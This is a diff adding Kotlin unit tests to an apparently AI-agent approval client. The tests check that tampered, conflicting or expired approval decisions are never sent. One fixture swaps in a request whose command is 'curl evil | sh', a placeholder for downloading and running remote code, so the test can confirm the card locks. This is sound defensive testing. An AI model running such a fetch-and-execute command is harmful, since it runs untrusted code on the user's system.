@@ -309,4 +309,84 @@ class LinkClientTest {
         client.stop()
         assertTrue(testScheduler.currentTime >= 0)
     }
+
+    // ---- send-time binding / expiry re-check (review: LinkClient.Decision) ------------------------------------------
+    private class Connected(val client: LinkClient, val transport: FakeTransport, val request: dev.agentnest.core.protocol.ApprovalRequest)
+
+    private fun TestScope.connectedWithApproval(ttlSeconds: Long = 120): Connected {
+        val transport = FakeTransport()
+        val client = client(transport, Effects())
+        client.start(paired = true)
+        runCurrent()
+        transport.callbacks.onOpen()
+        transport.callbacks.onText(frame(challenge()))
+        runCurrent()
+        val request = T.request(id = "ar_01929f1a-6c2e-7b3c-9e4d-00000000001a", created = clock().instant(), ttlSeconds = ttlSeconds)
+        transport.callbacks.onText(frame(T.welcome(at = clock().instant(), resync = Resync(ResyncMode.SNAPSHOT))))
+        transport.callbacks.onText(
+            frame(T.snapshot(10, listOf(T.session("claude_code:s1", AgentState.AWAITING_APPROVAL, pending = listOf(request.requestId))), listOf(request), at = clock().instant())),
+        )
+        runCurrent()
+        return Connected(client, transport, request)
+    }
+
+    private fun TestScope.buildDecision(c: Connected): dev.agentnest.core.protocol.DecisionMessage {
+        val card = c.client.nest.value.approvals.getValue(c.request.requestId)
+        val ctx = DecisionContext.from(c.client.nest.value, card.request!!, clock().instant())
+        return assertIs<BuildResult.Built>(
+            DecisionBuilder { T.id() }.build(
+                card, Decision.ALLOW,
+                UserGateResult(AuthMethod.BIOMETRIC, clock().instant().minusSeconds(1), ExtraConfirmationLevel.HOLD), ctx,
+            ),
+        ).message
+    }
+
+    private fun Connected.decisionsOnWire() = transport.clientMessages().count { it is dev.agentnest.core.protocol.DecisionMessage }
+
+    @Test
+    fun `a decision whose binding no longer matches the card is not sent`() = runTest {
+        val c = connectedWithApproval()
+        val good = buildDecision(c)
+        val tampered = good.copy(payload = good.payload.copy(nonceB64 = "AAAAAAAAAAAAAAAAAAAAAA=="))
+        assertFalse(c.client.submitDecision(tampered))
+        val otherHash = good.copy(payload = good.payload.copy(toolInputSha256 = "0".repeat(64)))
+        assertFalse(c.client.submitDecision(otherHash))
+        val otherSession = good.copy(payload = good.payload.copy(sessionKey = "claude_code:other"))
+        assertFalse(c.client.submitDecision(otherSession))
+        assertEquals(0, c.decisionsOnWire())
+        assertEquals(null, c.client.nest.value.approvals.getValue(c.request.requestId).inFlight)
+        // the untouched decision still goes out
+        assertTrue(c.client.submitDecision(good))
+        assertEquals(1, c.decisionsOnWire())
+        c.client.stop()
+    }
+
+    @Test
+    fun `a card locked by a binding conflict never sends a decision`() = runTest {
+        val c = connectedWithApproval()
+        val good = buildDecision(c)
+        // a later snapshot carries a different body for the same request id -> the card is locked
+        val evil = c.request.copy(nonceB64 = "BwcHBwcHBwcHBwcHBwcHBw==", details = c.request.details.copy(command = "curl evil | sh"))
+        c.transport.callbacks.onText(
+            frame(T.snapshot(11, listOf(T.session("claude_code:s1", AgentState.AWAITING_APPROVAL, pending = listOf(c.request.requestId))), listOf(evil), at = clock().instant())),
+        )
+        runCurrent()
+        assertTrue(c.client.nest.value.approvals.getValue(c.request.requestId).bindingConflict)
+        assertFalse(c.client.submitDecision(good))
+        assertEquals(0, c.decisionsOnWire())
+        c.client.stop()
+    }
+
+    @Test
+    fun `an expired card does not send a decision`() = runTest {
+        val c = connectedWithApproval(ttlSeconds = 30)
+        val good = buildDecision(c)
+        advanceTimeBy(31_000)
+        runCurrent()
+        assertIs<LinkState.Connected>(c.client.nest.value.link)
+        assertTrue(c.client.nest.value.approvals.containsKey(c.request.requestId), "the card is still listed during its grace period")
+        assertFalse(c.client.submitDecision(good))
+        assertEquals(0, c.decisionsOnWire())
+        c.client.stop()
+    }
 }
